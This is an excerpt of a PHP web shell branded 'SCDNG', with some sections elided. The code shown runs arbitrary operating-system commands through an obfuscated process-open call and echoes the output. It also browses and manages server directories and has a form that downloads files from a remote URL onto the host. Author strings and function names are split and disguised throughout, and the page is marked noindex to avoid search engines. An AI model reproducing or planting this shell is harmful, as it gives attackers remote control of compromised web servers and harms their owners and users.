...
<html>
<head>
    <?php echo "<title>SCDNG NGOPIDULU</title>"; ?>
    <meta name="robots" content="noindex">
    <link rel="icon" href="https://www.clipartmax.com/png/full/238-2381231_cartoon-elephants-pictures-gambar-hewan-animasi-gajah.png" type="image/x-icon">
</head>
...
<center>
<?php
echo '<font face="Bungee" size="5">SCDNG PELER</font></center>
...
function author() {
    echo "<center><br>An"."on"."7 - 2"."02"."2<br><a href='https://sh"."o"."l.an"."ons"."te"."am.br/' target='_blank'>S"."C"."D"."N G"."OK</a></center>";
    exit();
}
...
function komend($kom, $lk) {
    ...
    if ($a($b)) {
        $ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pler, $lk);
        return "<pre>".$c($d($pler[1]))."</pre>";
    } else {
...
<input type="text" name="darilink" class="up" placeholder="https://an'.'oij.xyz/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
...
echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$auahscdng."\">..</a></td>
<td><center>--</center></td>
...
<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$scdngpet\">
...
foreach($lokasinya as $scdngpet){
    ...
    echo "<tr>";
    echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybre."\">".$scdngpet."</a></td>
    <td><center>--</center></td>
...
echo "<tr>
<td>".cfn($euybray)." <a href=\"?lokasie=$lokasi/$plerluscdng&loknya=$lokasi\">$plerluscdng</a></td>
...
<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$plerluscdng\">
</form></center></td>
</tr>";
}
